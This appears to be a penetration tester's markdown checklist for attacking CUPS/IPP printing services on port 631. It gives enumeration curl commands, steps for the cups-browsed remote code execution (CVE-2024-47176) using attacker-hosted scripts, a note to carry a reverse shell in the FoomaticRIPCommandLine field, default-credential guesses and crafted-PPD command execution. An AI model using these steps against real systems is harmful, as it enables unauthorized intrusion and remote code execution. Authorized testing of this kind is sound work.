# CUPS / IPP

## Before I start
- [ ] 631/tcp (IPP + web admin) and/or 631/udp (cups-browsed) in the scan

## Enum
curl -s http://<TargetIP>:631/ | head
curl -s http://<TargetIP>:631/printers/
curl -s http://<TargetIP>:631/jobs/
- [ ] Web UI leaks printer names, queued docs, usernames, versions — collect even when admin needs auth
- [ ] ipptool -tv ipp://<TargetIP>:631/ get-printer-attributes.test

## cups-browsed RCE (CVE-2024-47176, pre-Sept-2024 hosts)
python3 evil-ipp.py <AttackerIP>
python3 send_udp.py <TargetIP> <AttackerIP>
- [ ] One UDP packet = rogue IPP server registered; PPD executes when anything prints
- [ ] *FoomaticRIPCommandLine carries the payload; keep it a one-shot reverse shell
- [ ] No print job = no exec — trigger a test page from the web UI if I can

## Admin access
- [ ] Creds tried: root/root, root/<OS password>, any lpadmin group member
- [ ] Add printer with crafted PPD (*FoomaticRIPCommandLine / *cupsFilter) = command exec
- [ ] /admin/log/error_log leaks paths + occasional creds

## If it fails
- [ ] 631 closed/filtered → printing not exposed; move on
- [ ] Post-Sept-2024 → cups-browsed removed; admin-PPD path only

## Next
- [ ] lp/filter-user shell → :Pb linux-enum, :Pb sudo
- [ ] Queue documents → :Pb linux-creds
